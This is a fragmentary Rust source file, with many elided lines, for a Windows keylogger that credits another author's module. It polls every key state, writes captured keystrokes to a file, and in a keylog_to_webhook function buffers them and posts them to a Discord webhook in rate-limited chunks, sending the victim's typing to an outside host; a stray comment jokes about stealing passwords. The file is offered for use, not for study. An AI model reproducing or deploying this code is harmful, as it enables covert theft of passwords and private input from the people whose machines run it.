// HUGE THANKS TO THE CREATOR OF THIS MODULE @5mukx
// I hate writing keyloggers and they did all the hard stuff
// Before I even had to!

// That being said this is a custom implementation of the module.
...
// log function . This is where you write your keys into this !
            ...
            thread::sleep(Duration::from_millis(10));
                ...
                for i in 0 as c_int..255 as c_int {
                    ...
                    if (key & 1) > 0 {
                        ...
                        log(&mut file, s); // This line writes to file with some flushing hijinks, is end of function.
                    }
                }
            }
        }
...
pub fn keylog_to_webhook(webhook: String){
    // we are using winapi only for this function alone so to avoid verbose, we are importing winapi's into this function only !
    //-----------------------WINAPI-------------------------//
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::psapi::GetProcessImageFileNameW;
    ...
    unsafe{
        ...
        // Discord Ratelimits messages, so we will chunk them together into this buffer and then send with a time delay
        ...
        thread::spawn(move || {
            loop {
                ...
                {
                    let mut mutex = lb.lock().unwrap();
                    if *mutex == "" {
                        continue;
                    }
                    body.insert("content", mutex.clone());
                    *mutex = String::new();
                }
                ...
                let _ = client.post(&webhook)
                                ...
                                .send();
            } // lets make some sort of keyloggable thing here why is it not working anymore? get my password suck my cock any more data?
        }); 
            ...
            thread::sleep(Duration::from_millis(10));
                ...
                for i in 0 as c_int..255 as c_int {
                    ...
                    if (key & 1) > 0 {
                        ...
                        // THIS IS WHERE THE OUTPUT OF THIS FUNCTION CALL IS ROUTED!
                        // All written to a file, change this to change the output.

                        {
                            log_buffer.lock().unwrap().push_str(&s);
                        }
                        //debug!("{}", r.unwrap().text().unwrap());
                    }
                }
            }
        }
